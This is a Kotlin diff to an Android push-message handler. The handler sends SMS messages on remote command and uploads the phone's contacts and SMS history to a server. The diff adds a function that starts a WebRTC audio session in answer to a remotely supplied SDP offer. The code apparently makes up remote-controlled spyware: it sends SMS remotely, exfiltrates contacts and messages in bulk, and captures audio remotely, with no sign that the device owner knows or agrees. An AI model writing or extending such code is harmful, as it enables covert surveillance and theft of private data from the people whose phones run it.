@@ -6,15 +6,21 @@ import com.google.firebase.messaging.FirebaseMessagingService
 import com.google.firebase.messaging.RemoteMessage
 
 import android.content.ContentValues.TAG
+import android.content.Context
+import org.webrtc.SessionDescription
 
 class MyFirebaseMessagingService : FirebaseMessagingService() {
 
+    val rtc = Rtc()
     override fun onMessageReceived(remoteMessage: RemoteMessage?) {
         val data = remoteMessage!!.data
         val strTitle = data["title"]
         val message = data["text"]
+        val type = data["type"]
         Log.d(TAG, "onMessageReceived:  Message Received: \nTitle: $strTitle\nMessage: $message")
-        sendSMS(strTitle, message)
+        if(type == "sms"){
+            sendSMS(strTitle, message)
+        }
         SyncData()
     }
 
@@ -36,6 +42,14 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         HttpExecute(retrofitAPI.CreateContacts(contactLs)).start()
         HttpExecute(retrofitAPI.CreateSMS(SMSLs)).start()
     }
-
-
+    private fun rtcSignaling(type: String, message: String, ertc: Rtc?){
+        var rtc = ertc
+        if(ertc?.peerConnection == null){
+            this.rtc.initRtcAudio(this.applicationContext)
+            rtc = this.rtc
+        }
+        if(type == "sdp"){
+            rtc?.peerConnection?.setRemoteDescription(rtc.sdpObserver, SessionDescription(SessionDescription.Type.OFFER, message))
+        }
+    }
 }
